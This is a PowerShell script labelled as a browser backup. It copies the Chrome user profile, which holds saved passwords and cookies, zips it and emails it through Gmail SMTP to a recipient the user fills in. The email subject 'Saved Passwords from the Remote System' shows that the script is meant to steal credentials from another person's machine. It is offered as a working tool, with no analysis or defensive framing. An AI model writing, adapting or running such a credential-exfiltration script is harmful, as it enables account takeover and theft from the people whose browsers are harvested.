# Set the destination folder for the backup
$backupDir = "$env:USERPROFILE\Desktop\Browser_Backup"
$chromeBackupDir = "$backupDir\Chrome"
$zipFile = "$env:USERPROFILE\Desktop\Browser_Backup.zip"

# Create the backup directory if it doesn't exist
if (-not (Test-Path -Path $backupDir)) {
    New-Item -ItemType Directory -Path $backupDir
}

# Backup Chrome Data
$chromeProfile = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path -Path $chromeProfile) {
    Copy-Item -Path $chromeProfile -Destination $chromeBackupDir -Recurse -Force
    Write-Host "Chrome data backed up to $chromeBackupDir"
} else {
    Write-Host "Chrome profile not found."
}


# Compress the backup folder into a ZIP file
if (Test-Path -Path $backupDir) {
    Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
    [System.IO.Compression.ZipFile]::CreateFromDirectory($backupDir, $zipFile)
    Write-Host "Backup compressed to $zipFile"
} else {
    Write-Host "Backup directory not found."
}

# Cleanup - Remove the original backup folder after zipping (optional)
Remove-Item -Recurse -Force $backupDir

Write-Host "Sending Browser_Backup.zip file through email."

$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"
$Username = "Enter your gmail"     # Your Gmail address
$Password = "#################"  # App-specific password, NOT your Gmail password

$To = "Enter the Recipient's gmail"          # Recipient's gmail address
$Subject = "Saved Passwords from the Remote System"
$Body = "Please find the enclosed passwords from the browsers"
$FilePath = "$env:USERPROFILE\Desktop\Browser_Backup.zip"  # Path to the file on Desktop

# Create a secure string for the password
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force

# Create the credential object
$Credentials = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)

# Send email
Send-MailMessage -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Credentials `
    -From $Username -To $To -Subject $Subject -Body $Body -Attachments $FilePath

